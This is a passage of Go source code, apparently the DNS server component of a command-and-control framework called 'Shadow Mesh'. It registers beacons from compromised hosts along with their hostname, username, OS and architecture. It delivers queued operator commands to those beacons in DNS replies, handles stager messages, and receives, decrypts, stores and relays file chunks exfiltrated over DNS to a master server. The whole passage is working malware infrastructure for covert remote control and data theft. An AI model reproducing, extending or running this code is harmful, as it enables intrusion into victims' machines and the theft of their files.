	c2.mutex.Lock()
	assembler, exists := c2.metadataAssemblers[normalized]
	if !exists {
		assembler = &metadataAssembler{}
		c2.metadataAssemblers[normalized] = assembler
	}
	payload, complete := assembler.addSegment(index, segment, isFinal)
	if complete {
		delete(c2.metadataAssemblers, normalized)
	}
	c2.mutex.Unlock()
	return payload, complete
}

func (c2 *C2Manager) enqueuePendingLabelChunk(frame *ExfilFrame, clientIP string) {
	normalized := normalizeExfilTag(frame.SessionTag)
	c2.mutex.Lock()
	c2.pendingLabelChunks[normalized] = append(c2.pendingLabelChunks[normalized], pendingLabelChunk{
		payload:  frame.Payload,
		counter:  frame.Counter,
		flags:    frame.Flags,
		clientIP: clientIP,
	})
	c2.mutex.Unlock()
}

func (c2 *C2Manager) flushPendingLabelChunks(tag string) {
	tracker, ok := c2.getExfilTagTracker(tag)
	if !ok || tracker.SessionID == 0 {
		return
	}
	pending := c2.drainPendingLabelChunks(tag)
	for _, chunk := range pending {
		meta := c2.buildMetadataFromTracker(tracker, chunk.counter, chunk.flags)
		if _, err := c2.handleExfilChunk(chunk.payload, meta, chunk.clientIP, nil); err != nil && c2.debug {
			logf("[Exfil] failed to process buffered chunk tag=%s idx=%d: %v", tag, chunk.counter, err)
		}
	}
}

func (c2 *C2Manager) drainPendingLabelChunks(tag string) []pendingLabelChunk {
	normalized := normalizeExfilTag(tag)
	c2.mutex.Lock()
	defer c2.mutex.Unlock()
	pending := c2.pendingLabelChunks[normalized]
	if len(pending) > 0 {
		delete(c2.pendingLabelChunks, normalized)
	}
	return pending
}

func (c2 *C2Manager) buildMetadataFromTracker(tracker *ExfilTagTracker, counter uint32, flags uint8) *ExfilMetadata {
	meta := &ExfilMetadata{
		Version:     ExfilProtocolVersion,
		SessionID:   tracker.SessionID,
		JobID:       tracker.JobID,
		ChunkIndex:  counter,
		TotalChunks: tracker.TotalChunks,
	}
	// Don't try to guess TotalChunks from counter - it would be wrong
	// Only set final flag based on explicit flags from the frame envelope
	if flags&FrameEnvelopeFlagFinal != 0 {
		meta.Flags |= ExfilFlagFinalChunk
	}
	return meta
}

func (c2 *C2Manager) cacheChunkInMemory(session *ExfilSession, chunkIndex uint32, data []byte) {
	c2.mutex.Lock()
	defer c2.mutex.Unlock()
	if session.PendingChunks == nil {
		session.PendingChunks = make(map[uint32][]byte)
	}
	session.PendingChunks[chunkIndex] = append([]byte(nil), data...)
}

// handleExfilChunk ingests a dedicated exfil client's chunk and forwards to Master.
// DNS server does NOT assemble - Master handles all assembly.
func (c2 *C2Manager) handleExfilChunk(encoded string, meta *ExfilMetadata, clientIP string, plaintextOverride []byte) (bool, error) {
	var (
		plaintext []byte
		err       error
	)
	if plaintextOverride != nil {
		plaintext = plaintextOverride
	} else {
		plaintext, err = decodeAndDecryptBytes(encoded, c2.aesKey)
		if err != nil {
			return false, fmt.Errorf("exfil decrypt failed: %w", err)
		}
	}

	if meta.PayloadLen != 0 && int(meta.PayloadLen) != len(plaintext) && c2.debug {
		logf("[Exfil] Payload length mismatch (expected %d, got %d)", meta.PayloadLen, len(plaintext))
	}

	sessionID := fmt.Sprintf("%08x", meta.SessionID)
	jobID := fmt.Sprintf("%08x", meta.JobID)
	session := c2.ensureExfilSession(sessionID, jobID, clientIP)

	if meta.IsHeader() || meta.ChunkIndex == ExfilHeaderChunkIndex {
		c2.handleExfilHeader(session, meta, plaintext)
		if c2.debug {
			logf("[Exfil] header session=%s job=%s name=%s size=%d chunks=%d", sessionID, jobID, session.FileName, session.FileSize, session.TotalChunks)
		}
		return true, nil
	}

	// Capture session fields under lock for use outside lock
	c2.mutex.Lock()
	if session.TotalChunks == 0 && meta.TotalChunks != 0 {
		session.TotalChunks = meta.TotalChunks
	}
	session.LastActivity = time.Now()
	// Capture values for forwarding (avoid race with goroutine)
	totalChunks := session.TotalChunks
	fileName := session.FileName
	fileSize := session.FileSize
	c2.mutex.Unlock()

	// Persist locally for retry capability (in case Master is temporarily unavailable)
	// CRITICAL: Only ACK if local persist succeeds - this ensures retries work
	localPersisted := false
	if c2.db != nil {
		if _, dbErr := c2.db.RecordExfilChunk(sessionID, meta.ChunkIndex, plaintext); dbErr != nil {
			logf("[Exfil] DB persist failed (session=%s idx=%d): %v - NACK to trigger retry", sessionID, meta.ChunkIndex, dbErr)
			// Don't ACK if we couldn't persist - client will retry
			return false, fmt.Errorf("local persist failed: %w", dbErr)
		}
		localPersisted = true
	}

	if c2.debug {
		logf("[Exfil] chunk session=%s idx=%d/%d bytes=%d - forwarding to Master", sessionID, meta.ChunkIndex, totalChunks, len(plaintext))
	}

	// Forward to Master asynchronously - Master handles deduplication and assembly
	// We ACK based on local persist, not Master success (async retry handles Master failures)
	if masterClient != nil && localPersisted {
		// Build request with captured values (no race)
		req := ExfilChunkRequest{
			SessionID:   sessionID,
			JobID:       jobID,
			ChunkIndex:  int(meta.ChunkIndex),
			TotalChunks: int(totalChunks),
			PayloadB64:  base64.StdEncoding.EncodeToString(plaintext),
			FileName:    fileName,
			FileSize:    int64(fileSize),
			IsFinal:     meta.IsFinal(),
		}
		go c2.submitExfilChunkToMasterDirect(req, sessionID, int(meta.ChunkIndex))
	}

	return localPersisted, nil
}

func (c2 *C2Manager) ensureExfilSession(sessionID, jobID, clientIP string) *ExfilSession {
	now := time.Now()
	c2.mutex.Lock()
	defer c2.mutex.Unlock()

	session, exists := c2.exfilSessions[sessionID]
	if !exists {
		session = &ExfilSession{
			SessionID:      sessionID,
			JobID:          jobID,
			ClientIP:       clientIP,
			Status:         "receiving",
			CreatedAt:      now,
			LastActivity:   now,
			ReceivedChunks: make(map[uint32]bool),
		}
		c2.exfilSessions[sessionID] = session
	} else {
		if session.JobID == "" && jobID != "" {
			session.JobID = jobID
		}
		if session.ClientIP == "" {
			session.ClientIP = clientIP
		}
		session.LastActivity = now
		if session.ReceivedChunks == nil {
			session.ReceivedChunks = make(map[uint32]bool)
		}
	}

	return session
}

func (c2 *C2Manager) handleExfilHeader(session *ExfilSession, meta *ExfilMetadata, payload []byte) {
	c2.mutex.Lock()
	if meta != nil {
		if meta.Name != "" {
			session.FileName = meta.Name
		}
		if meta.FileSize != 0 {
			session.FileSize = meta.FileSize
		}
		if meta.TotalChunks != 0 {
			session.TotalChunks = meta.TotalChunks
		}
	}
	if len(payload) > 0 {
		session.Note = string(payload)
	}
	if session.Status == "" {
		session.Status = "receiving"
	}
	session.LastActivity = time.Now()
	// Capture values for forwarding to Master
	totalChunks := session.TotalChunks
	fileName := session.FileName
	fileSize := session.FileSize
	sessionID := session.SessionID
	jobID := session.JobID
	c2.mutex.Unlock()

	c2.persistExfilSession(session)

	// SHADOW MESH: Forward header metadata to Master so it knows totalChunks
	// This is critical because other DNS servers may receive data chunks without metadata
	if masterClient != nil && totalChunks > 0 {
		req := ExfilChunkRequest{
			SessionID:   sessionID,
			JobID:       jobID,
			ChunkIndex:  0, // Header is chunk 0
			TotalChunks: int(totalChunks),
			FileName:    fileName,
			FileSize:    int64(fileSize),
			PayloadB64:  "", // Header has no data payload for Master
		}
		go func() {
			if _, err := masterClient.SubmitExfilChunk(req); err != nil && c2.debug {
				logf("[Exfil] Failed to forward header metadata to Master: %v", err)
			}
		}()
	}
}

func (c2 *C2Manager) persistExfilSession(session *ExfilSession) {
	if c2.db == nil || session == nil {
		return
	}

	c2.mutex.RLock()
	record := &ExfilSessionRecord{
		SessionID:      session.SessionID,
		JobID:          session.JobID,
		FileName:       session.FileName,
		FileSize:       int64(session.FileSize),
		TotalChunks:    int(session.TotalChunks),
		ReceivedChunks: session.ReceivedCount,
		Status:         session.Status,
		Note:           session.Note,
		ClientIP:       session.ClientIP,
		CreatedAt:      session.CreatedAt,
		UpdatedAt:      time.Now(),
		LastChunkAt:    session.LastChunkAt,
	}
	c2.mutex.RUnlock()
	if record.Status == "" {
		record.Status = "receiving"
	}
	if err := c2.db.UpsertExfilSession(record); err != nil && c2.debug {
		logf("[Exfil] Failed to persist session %s: %v", record.SessionID, err)
	}
}

func (c2 *C2Manager) submitExfilChunkToMasterDirect(req ExfilChunkRequest, sessionID string, chunkIndex int) {
	if masterClient == nil {
		return
	}

	_, err := masterClient.SubmitExfilChunk(req)
	if err != nil {
		if c2.debug {
			logf("[Exfil] Failed to forward chunk %d for session %s: %v - will retry from disk", chunkIndex, sessionID, err)
		}
		return
	}

	// Mark as synced in DB
	if c2.db != nil {
		if err := c2.db.MarkExfilChunkSynced(sessionID, chunkIndex); err != nil && c2.debug {
			logf("[Exfil] Failed to mark chunk synced (session=%s idx=%d): %v", sessionID, chunkIndex, err)
		}
	}
}

// syncSessionChunksToMaster syncs all unsynced chunks for a specific session to Master.
// Called before sending completion to ensure all chunks are delivered.
func (c2 *C2Manager) syncSessionChunksToMaster(sessionID string, totalChunks int) {
	if c2.db == nil || masterClient == nil {
		return
	}

	chunks, err := c2.db.GetUnsyncedExfilChunksForSession(sessionID, totalChunks)
	if err != nil {
		if c2.debug {
			logf("[Exfil] Failed to query unsynced chunks for session %s: %v", sessionID, err)
		}
		return
	}

	if len(chunks) == 0 {
		return
	}

	if c2.debug {
		logf("[Exfil] Syncing %d unsynced chunks for session %s before completion", len(chunks), sessionID)
	}

	for _, chunk := range chunks {
		chunkIndex := chunk["chunk_index"].(int)
		data := chunk["data"].([]byte)
		jobID := chunk["job_id"].(string)
		fileName := chunk["file_name"].(string)
		fileSize := chunk["file_size"].(int64)
		chunkTotalChunks := chunk["total_chunks"].(int)

		req := ExfilChunkRequest{
			SessionID:   sessionID,
			JobID:       jobID,
			ChunkIndex:  chunkIndex,
			TotalChunks: chunkTotalChunks,
			PayloadB64:  base64.StdEncoding.EncodeToString(data),
			FileName:    fileName,
			FileSize:    fileSize,
			IsFinal:     chunkTotalChunks > 0 && chunkIndex == chunkTotalChunks,
		}

		if _, err := masterClient.SubmitExfilChunk(req); err != nil {
			if c2.debug {
				logf("[Exfil] Failed to sync chunk %d for session %s: %v", chunkIndex, sessionID, err)
			}
			continue
		}

		if err := c2.db.MarkExfilChunkSynced(sessionID, chunkIndex); err != nil && c2.debug {
			logf("[Exfil] Failed to mark chunk synced (session=%s idx=%d): %v", sessionID, chunkIndex, err)
		}
	}
}

func (c2 *C2Manager) submitExfilChunkToMaster(session *ExfilSession, meta *ExfilMetadata, payload []byte) {
	if masterClient == nil || session == nil || meta == nil {
		return
	}

	c2.mutex.RLock()
	req := ExfilChunkRequest{
		SessionID:   session.SessionID,
		JobID:       session.JobID,
		ChunkIndex:  int(meta.ChunkIndex),
		TotalChunks: int(session.TotalChunks),
		PayloadB64:  base64.StdEncoding.EncodeToString(payload),
		FileName:    session.FileName,
		FileSize:    int64(session.FileSize),
		IsFinal:     meta.IsFinal(),
	}
	c2.mutex.RUnlock()

	_, err := masterClient.SubmitExfilChunk(req)
	if err != nil {
		if c2.debug {
			logf("[Exfil] Failed to forward chunk %d for session %s: %v - will retry from disk", meta.ChunkIndex, session.SessionID, err)
		}
		return
	}

	// Mark as synced in DB
	if c2.db != nil {
		if err := c2.db.MarkExfilChunkSynced(session.SessionID, int(meta.ChunkIndex)); err != nil && c2.debug {
			logf("[Exfil] Failed to mark chunk synced (session=%s idx=%d): %v", session.SessionID, meta.ChunkIndex, err)
		}
	}
}

// retryPendingExfilChunks periodically retries sending pending exfil chunks to Master
func (c2 *C2Manager) retryPendingExfilChunks() {
	ticker := time.NewTicker(10 * time.Second)
	defer ticker.Stop()

	for range ticker.C {
		// 1. Retry in-memory chunks (failed to write to DB)
		c2.retryInMemoryChunks()

		if c2.db == nil || masterClient == nil {
			continue
		}

		// 2. Retry unsynced chunks from DB (failed to send to Master)
		// Get unsynced chunks from DB (limit 50 per batch to avoid memory spikes)
		chunks, err := c2.db.GetUnsyncedExfilChunks(50)
		if err != nil {
			if c2.debug {
				logf("[Exfil] Failed to query unsynced chunks: %v", err)
			}
			continue
		}

		if len(chunks) == 0 {
			continue
		}

		if c2.debug {
			logf("[Exfil] Retrying %d unsynced chunks from disk", len(chunks))
		}

		for _, chunk := range chunks {
			sessionID := chunk["session_id"].(string)
			chunkIndex := chunk["chunk_index"].(int)
			data := chunk["data"].([]byte)
			jobID := chunk["job_id"].(string)
			fileName := chunk["file_name"].(string)
			fileSize := chunk["file_size"].(int64)
			totalChunks := chunk["total_chunks"].(int)

			req := ExfilChunkRequest{
				SessionID:   sessionID,
				JobID:       jobID,
				ChunkIndex:  chunkIndex,
				TotalChunks: totalChunks,
				PayloadB64:  base64.StdEncoding.EncodeToString(data),
				FileName:    fileName,
				FileSize:    fileSize,
				IsFinal:     totalChunks > 0 && chunkIndex == totalChunks,
			}

			completed, err := masterClient.SubmitExfilChunk(req)
			if err != nil {
				if c2.debug {
					logf("[Exfil] Retry Master forward failed (session=%s idx=%d): %v", sessionID, chunkIndex, err)
				}
				continue // Will be picked up next time
			}

			// Mark as synced
			if err := c2.db.MarkExfilChunkSynced(sessionID, chunkIndex); err != nil {
				logf("[Exfil] Failed to mark chunk synced (session=%s idx=%d): %v", sessionID, chunkIndex, err)
			}

			if completed {
				// If master says completed, we should finalize locally too
				c2.mutex.RLock()
				session, exists := c2.exfilSessions[sessionID]
				c2.mutex.RUnlock()
				if exists {
					go c2.finalizeExfilSession(session)
				}
			}
		}
	}
}

// retryInMemoryChunks attempts to persist chunks that failed to write to DB
func (c2 *C2Manager) retryInMemoryChunks() {
	// Collect sessions with pending chunks to avoid holding lock while processing
	c2.mutex.RLock()
	var sessionsWithPending []*ExfilSession
	for _, session := range c2.exfilSessions {
		if len(session.PendingChunks) > 0 {
			sessionsWithPending = append(sessionsWithPending, session)
		}
	}
	c2.mutex.RUnlock()

	for _, session := range sessionsWithPending {
		c2.processSessionPendingChunks(session)
	}
}

// processSessionPendingChunks attempts to process pending chunks for a session
func (c2 *C2Manager) processSessionPendingChunks(session *ExfilSession) {
	c2.mutex.Lock()
	// Copy pending chunks to avoid holding lock during network ops
	pending := make(map[uint32][]byte)
	for k, v := range session.PendingChunks {
		pending[k] = v
	}
	c2.mutex.Unlock()

	if len(pending) == 0 {
		return
	}

	if c2.debug {
		logf("[Exfil] Retrying %d pending in-memory chunks for session %s", len(pending), session.SessionID)
	}

	for idx, data := range pending {
		success := false

		// 1. Try to persist to DB first
		if c2.db != nil {
			inserted, err := c2.db.RecordExfilChunk(session.SessionID, idx, data)
			if err == nil {
				success = true
				// If inserted (new) or already exists, we consider it "safe" on disk.
				// It will be picked up by the DB retry loop (GetUnsyncedExfilChunks)
				// because RecordExfilChunk inserts with synced=0.
				if !inserted && c2.debug {
					logf("[Exfil] Chunk %d for session %s already on disk", idx, session.SessionID)
				}
			} else if c2.debug {
				logf("[Exfil] Retry DB persist failed (session=%s idx=%d): %v", session.SessionID, idx, err)
			}
		}

		// 2. If DB is unavailable or failed, try Master directly (fallback)
		if !success && masterClient != nil {
			c2.mutex.RLock()
			req := ExfilChunkRequest{
				SessionID:   session.SessionID,
				JobID:       session.JobID,
				ChunkIndex:  int(idx),
				TotalChunks: int(session.TotalChunks),
				PayloadB64:  base64.StdEncoding.EncodeToString(data),
				FileName:    session.FileName,
				FileSize:    int64(session.FileSize),
				IsFinal:     session.TotalChunks > 0 && idx == session.TotalChunks,
			}
			c2.mutex.RUnlock()

			completed, err := masterClient.SubmitExfilChunk(req)
			if err == nil {
				success = true
				if completed {
					go c2.finalizeExfilSession(session)
				}
			} else if c2.debug {
				logf("[Exfil] Retry Master forward failed (session=%s idx=%d): %v", session.SessionID, idx, err)
			}
		}

		if success {
			c2.mutex.Lock()
			delete(session.PendingChunks, idx)
			c2.mutex.Unlock()
		}
	}
}

// finalizeExfilSession marks a session as complete locally and notifies Master
func (c2 *C2Manager) finalizeExfilSession(session *ExfilSession) {
	c2.mutex.Lock()
	if session.Status == "completed" {
		c2.mutex.Unlock()
		return
	}
	session.Status = "completed"
	session.LastActivity = time.Now()
	c2.mutex.Unlock()

	c2.persistExfilSession(session)

	// Notify Master to trigger artifact assembly
	if masterClient != nil {
		go func(s *ExfilSession) {
			req := ExfilCompleteRequest{
				DNSServerID: masterClient.serverID,
				APIKey:      masterClient.apiKey,
				SessionID:   s.SessionID,
				TotalChunks: int(s.TotalChunks),
			}
			if err := masterClient.MarkExfilComplete(req); err != nil {
				if c2.debug {
					logf("[Exfil] Failed to notify Master of completion for session %s: %v", s.SessionID, err)
				}
			} else if c2.debug {
				logf("[Exfil] Notified Master of completion for session %s", s.SessionID)
			}
		}(session)
	}

	if c2.debug {
		logf("[Exfil] Finalized session %s (local status=completed)", session.SessionID)
	}
}

// GetKnownDomains returns the list of active domains
func (c2 *C2Manager) GetKnownDomains() []string {
	c2.mutex.RLock()
	defer c2.mutex.RUnlock()
	return append([]string(nil), c2.knownDomains...)
}

// SetKnownDomains updates the list of active domains
func (c2 *C2Manager) SetKnownDomains(domains []string) {
	c2.mutex.Lock()
	defer c2.mutex.Unlock()
	c2.knownDomains = domains
}

// GetBeacons returns a list of all registered beacons
func (c2 *C2Manager) GetBeacons() []*Beacon {
	c2.mutex.RLock()
	defer c2.mutex.RUnlock()

	beacons := make([]*Beacon, 0, len(c2.beacons))
	for _, b := range c2.beacons {
		beacons = append(beacons, b)
	}
	return beacons
}

// AddDomainUpdateTask adds a task to update domains for a beacon
func (c2 *C2Manager) AddDomainUpdateTask(beaconID, command string) string {
	c2.mutex.Lock()
	defer c2.mutex.Unlock()

	// Generate a unique ID for domain update tasks (D prefix)
	c2.domainTaskCounter++
	taskID := fmt.Sprintf("D%04d", c2.domainTaskCounter)

	task := &Task{
		ID:        taskID,
		BeaconID:  beaconID,
		Command:   command,
		Status:    "pending",
		CreatedAt: time.Now(),
	}

	c2.tasks[taskID] = task

	if beacon, exists := c2.beacons[beaconID]; exists {
		beacon.TaskQueue = append(beacon.TaskQueue, *task)
	}

	// Persist task
	if c2.db != nil {
		go func() {
			if err := c2.db.SaveTask(task); err != nil && c2.debug {
				logf("[DB] Failed to save domain task: %v", err)
			}
		}()
	}

	return taskID
}

// AddTaskFromMaster adds a task received from the Master Server
// SHADOW MESH FIX: Use Master's task ID directly instead of generating local IDs.
// This ensures all DNS servers use the same task ID, so when a beacon sends results
// to a different DNS server than the one that delivered the task, the task ID matches.
func (c2 *C2Manager) AddTaskFromMaster(masterTaskID, beaconID, command string) {
	c2.mutex.Lock()
	defer c2.mutex.Unlock()

	// Check if we already have this task (deduplication)
	if _, exists := c2.tasks[masterTaskID]; exists {
		return
	}

	// Check if this task is already in progress (delivered by this or another server)
	if _, inProgress := c2.tasksInProgress[masterTaskID]; inProgress {
		return
	}

	// SHADOW MESH: Use Master's task ID directly - all DNS servers will have the same ID
	// This replaces the old local task counter approach that caused ID mismatches
	c2.masterTaskIDs[masterTaskID] = masterTaskID

	task := &Task{
		ID:        masterTaskID,
		BeaconID:  beaconID,
		Command:   command,
		Status:    "pending",
		CreatedAt: time.Now(),
	}

	c2.tasks[masterTaskID] = task

	if beacon, exists := c2.beacons[beaconID]; exists {
		// Append a copy of the task value, but updates to c2.tasks[masterTaskID]
		// will be the authoritative source for status changes
		beacon.TaskQueue = append(beacon.TaskQueue, *task)
	}

	// Persist task
	if c2.db != nil {
		go func() {
			if err := c2.db.SaveTask(task); err != nil && c2.debug {
				logf("[DB] Failed to save master task: %v", err)
			}
		}()
	}
}

// SyncBeaconFromMaster updates a beacon from Master Server data
func (c2 *C2Manager) SyncBeaconFromMaster(data BeaconData) {
	c2.mutex.Lock()
	defer c2.mutex.Unlock()

	beacon, exists := c2.beacons[data.ID]
	if !exists {
		beacon = &Beacon{
			ID:        data.ID,
			Hostname:  data.Hostname,
			Username:  data.Username,
			OS:        data.OS,
			Arch:      data.Arch,
			IPAddress: data.IPAddress,
			FirstSeen: data.FirstSeen,
			LastSeen:  data.LastSeen,
			TaskQueue: []Task{},
		}
		c2.beacons[data.ID] = beacon

		// Persist new beacon
		if c2.db != nil {
			go func(b *Beacon) {
				if err := c2.db.SaveBeacon(b); err != nil && c2.debug {
					logf("[DB] Failed to save synced beacon: %v", err)
				}
			}(beacon)
		}
	} else {
		// Update existing beacon if Master has newer info
		if data.LastSeen.After(beacon.LastSeen) {
			beacon.LastSeen = data.LastSeen
			beacon.IPAddress = data.IPAddress

			// Persist update
			if c2.db != nil {
				go func(b *Beacon) {
					if err := c2.db.UpdateBeaconStatus(b.ID, "active"); err != nil && c2.debug {
						logf("[DB] Failed to update synced beacon: %v", err)
					}
				}(beacon)
			}
		}
	}
}

// UpdateTaskStatusFromMaster updates a task status based on Master Server data
// SHADOW MESH FIX: Task ID is now the master ID directly, no lookup needed
func (c2 *C2Manager) UpdateTaskStatusFromMaster(masterTaskID, status string) {
	c2.mutex.Lock()
	defer c2.mutex.Unlock()

	// SHADOW MESH: Task ID IS the master ID now - direct lookup
	task, exists := c2.tasks[masterTaskID]
	if !exists {
		return
	}

	// Update status
	if task.Status != status {
		oldStatus := task.Status
		task.Status = status

		// If task is no longer pending (sent/completed/failed by another server),
		// remove from beacon's TaskQueue to prevent duplicate delivery
		if oldStatus == "pending" && (status == "sent" || status == "completed" || status == "failed") {
			if beacon, ok := c2.beacons[task.BeaconID]; ok {
				// Remove task from queue
				newQueue := make([]Task, 0, len(beacon.TaskQueue))
				for _, t := range beacon.TaskQueue {
					if t.ID != masterTaskID {
						newQueue = append(newQueue, t)
					}
				}
				if len(newQueue) != len(beacon.TaskQueue) {
					beacon.TaskQueue = newQueue
					if c2.debug {
						logf("[C2] Removed task %s from beacon %s queue (status: %s, delivered by another server)",
							masterTaskID, task.BeaconID, status)
					}
				}
			}
			// Also mark in tasksInProgress to prevent re-delivery if queued again
			c2.tasksInProgress[masterTaskID] = time.Now()
		}

		// If completed/failed, clear from beacon's current task
		if status == "completed" || status == "failed" {
			if beacon, ok := c2.beacons[task.BeaconID]; ok && beacon.CurrentTask == masterTaskID {
				beacon.CurrentTask = ""
			}
		}

		// Persist update
		if c2.db != nil {
			go func(tid, s string) {
				if err := c2.db.UpdateTaskStatus(tid, s); err != nil && c2.debug {
					logf("[DB] Failed to update task status: %v", err)
				}
			}(masterTaskID, status)
		}
	}
}

// processBeaconQuery handles incoming DNS queries from beacons
func (c2 *C2Manager) processBeaconQuery(qname string, clientIP string) (string, bool) {
	// Check if query matches our domain
	if !strings.HasSuffix(qname, c2.domain) {
		return "", false
	}

	// Extract payload (subdomain)
	parts := strings.Split(qname, ".")
	if len(parts) < 3 {
		return "", false
	}

	// Payload is everything before the domain
	// e.g. payload.timestamp.domain.com -> payload (strip timestamp too)
	// Format: <base36_data>[.<more_data>].<timestamp>.<domain>
	domainParts := strings.Split(c2.domain, ".")
	payloadParts := parts[:len(parts)-len(domainParts)]

	// SHADOW MESH: Stagers include a timestamp label for cache busting
	// Format: payload.timestamp.domain or payload1.payload2.timestamp.domain
	// We need to strip the timestamp (last numeric label before domain)
	if len(payloadParts) >= 2 {
		lastPart := payloadParts[len(payloadParts)-1]
		// Check if last part is a unix timestamp (all digits, reasonable length)
		if len(lastPart) >= 9 && len(lastPart) <= 11 {
			isTimestamp := true
			for _, c := range lastPart {
				if c < '0' || c > '9' {
					isTimestamp = false
					break
				}
			}
			if isTimestamp {
				// Strip the timestamp
				payloadParts = payloadParts[:len(payloadParts)-1]
			}
		}
	}

	encodedPayload := strings.Join(payloadParts, "")

	// Decode payload - try encrypted first (for beacons), then plain base36 (for stagers)
	decoded, err := c2.decodeBeaconData(encodedPayload)
	if err != nil {
		// AES-GCM decryption failed - try plain base36 decode (for stagers)
		decoded, err = base36DecodeString(encodedPayload)
		if err != nil {
			// Not a valid beacon or stager query
			return "", false
		}
		// Check if this looks like a stager message
		if !strings.HasPrefix(decoded, "STG|") && !strings.HasPrefix(decoded, "CHUNK|") {
			// Not a recognized stager message, and AES decryption failed
			return "", false
		}
		// It's a stager message - continue processing
		if c2.debug {
			logf("[C2] Decoded stager message (plain base36): %s (from %s)", decoded, clientIP)
		}
	} else {
		// Debug: Log the decoded beacon message
		if c2.debug {
			logf("[C2] Decoded beacon message: %s (from %s)", decoded, clientIP)
		}
	}

	// Parse beacon data - STRICTLY pipe-delimited for DNS C2
	// Format: TYPE|DATA...
	msgParts := strings.Split(decoded, "|")
	if len(msgParts) < 2 {
		if c2.debug {
			logf("[C2] Invalid payload format (too short)")
		}
		return "", false
	}

	msgType := msgParts[0]

	// Common variables
	var beaconID string

	switch msgType {
	case "CHK":
		// CHK|id|hostname|username|os|arch|timestamp
		if len(msgParts) < 6 {
			return "", false
		}
		beaconID = msgParts[1]
		hostname := msgParts[2]
		username := msgParts[3]
		osType := msgParts[4]
		arch := msgParts[5]

		c2.mutex.Lock()
		now := time.Now()
		beacon, exists := c2.beacons[beaconID]

		// Register or update beacon
		if !exists {
			beacon = &Beacon{
				ID:        beaconID,
				Hostname:  hostname,
				Username:  username,
				OS:        osType,
				Arch:      arch,
				FirstSeen: now,
				LastSeen:  now,
				IPAddress: clientIP,
				TaskQueue: []Task{},
			}
			c2.beacons[beaconID] = beacon
			logf("[C2] New beacon registered: %s (%s@%s)", beacon.ID, beacon.Username, beacon.Hostname)

			// Persist new beacon synchronously before reporting to Master
			// This ensures beacon state is saved before Master knows about it
			if c2.db != nil {
				if err := c2.db.SaveBeacon(beacon); err != nil {
					logf("[DB] Failed to save new beacon: %v", err)
				}
			}

			// Report to Master (async - OK since DB save is complete)
			if masterClient != nil {
				go masterClient.ReportBeacon(beacon)
			}
		} else {
			beacon.LastSeen = now
			beacon.IPAddress = clientIP

			// Persist update (async to avoid blocking - updates are less critical)
			if c2.db != nil {
				go func(id string) {
					if err := c2.db.UpdateBeaconStatus(id, "active"); err != nil && c2.debug {
						logf("[DB] Failed to update beacon status: %v", err)
					}
				}(beacon.ID)
			}

			// Report updated LastSeen to Master
			if masterClient != nil {
				go masterClient.ReportBeacon(beacon)
			}
		}

		// Check for pending tasks
		if len(beacon.TaskQueue) > 0 {
			// Get next task
			task := beacon.TaskQueue[0]

			// SHADOW MESH: Check if this task is already in-progress (being executed)
			// This prevents re-delivering a task when beacon checks in via different DNS server
			if _, inProgress := c2.tasksInProgress[task.ID]; inProgress {
				// Task is already being executed - skip it and remove from queue
				beacon.TaskQueue = beacon.TaskQueue[1:]
				if c2.debug {
					logf("[C2] Skipping task %s for beacon %s - already in progress", task.ID, beacon.ID)
				}
				c2.mutex.Unlock()
				return "ACK", true
			}

			// Mark task as in-progress BEFORE sending to prevent race with other DNS servers
			c2.tasksInProgress[task.ID] = time.Now()

			beacon.TaskQueue = beacon.TaskQueue[1:] // Dequeue
			beacon.CurrentTask = task.ID
			if taskPtr, exists := c2.tasks[task.ID]; exists {
				taskPtr.Status = "sent"
				taskPtr.SentAt = &now
			}
			task.Status = "sent"
			task.SentAt = &now

			logf("[C2] Sending task %s to beacon %s: %s", task.ID, beacon.ID, task.Command)

			// Persist task update
			if c2.db != nil {
				go func(t Task) {
					if err := c2.db.SaveTask(&t); err != nil && c2.debug {
						logf("[DB] Failed to update task status: %v", err)
					}
				}(task)
			}

			// Notify Master that we delivered the task
			if masterClient != nil {
				if masterID, ok := c2.masterTaskIDs[task.ID]; ok {
					go masterClient.MarkTaskDelivered(masterID)
				}
			}

			c2.mutex.Unlock()
			return fmt.Sprintf("TASK|%s|%s", task.ID, task.Command), true
		}
		c2.mutex.Unlock()
		return "ACK", true

	case "RESULT_META":
		// RESULT_META|id|taskID|len|chunks|timestamp
		if len(msgParts) < 5 {
			return "", false
		}
		beaconID = msgParts[1]
		taskID := msgParts[2]
		totalSize, _ := strconv.Atoi(msgParts[3])
		totalChunks, _ := strconv.Atoi(msgParts[4])

		// Mark task as in-progress to prevent re-delivery by this DNS server
		c2.mutex.Lock()
		if _, inProgress := c2.tasksInProgress[taskID]; !inProgress {
			c2.tasksInProgress[taskID] = time.Now()
			if c2.debug {
				logf("[C2] Task %s marked in-progress (received RESULT_META)", taskID)
			}
		}

		// Track metadata locally (for totalChunks lookup and logging)
		if _, exists := c2.expectedResults[taskID]; !exists {
			c2.expectedResults[taskID] = &ExpectedResult{
				BeaconID:    beaconID,
				TaskID:      taskID,
				TotalSize:   totalSize,
				TotalChunks: totalChunks,
				ReceivedAt:  time.Now(),
				// No ReceivedData - Master handles assembly
			}
			if c2.debug {
				logf("[C2] Expecting result for task %s: %d chunks, %d bytes", taskID, totalChunks, totalSize)
			}
		}
		c2.mutex.Unlock()

		// Forward metadata to Master so it knows to expect chunks
		// Master will ignore this (chunk_index=0 with empty data) but it helps with logging
		if masterClient != nil {
			c2.mutex.RLock()
			masterID, isMasterTask := c2.masterTaskIDs[taskID]
			c2.mutex.RUnlock()

			if isMasterTask {
				go masterClient.SubmitResult(masterID, beaconID, 0, totalChunks, "")
			}
		}

		return "ACK", true

	case "DATA":
		// DATA|id|taskID|chunkIndex|chunk|timestamp
		// Use SplitN to preserve pipes in chunk data
		dataParts := strings.SplitN(decoded, "|", 5)
		if len(dataParts) < 5 {
			return "", false
		}

		// The last part contains "chunk|timestamp"
		lastPart := dataParts[4]
		lastPipeIdx := strings.LastIndex(lastPart, "|")
		if lastPipeIdx == -1 {
			return "", false
		}

		chunkData := lastPart[:lastPipeIdx]
		beaconID = dataParts[1]
		taskID := dataParts[2]
		chunkIndex, _ := strconv.Atoi(dataParts[3])

		// Mark task as in-progress to prevent re-delivery by this DNS server
		c2.mutex.Lock()
		if _, inProgress := c2.tasksInProgress[taskID]; !inProgress {
			c2.tasksInProgress[taskID] = time.Now()
			if c2.debug {
				logf("[C2] Task %s marked in-progress (received DATA chunk %d)", taskID, chunkIndex)
			}
		}
		c2.mutex.Unlock()

		// Get totalChunks from expected results (if we have it)
		var totalChunks int
		c2.mutex.RLock()
		if expected, ok := c2.expectedResults[taskID]; ok {
			totalChunks = expected.TotalChunks
		}
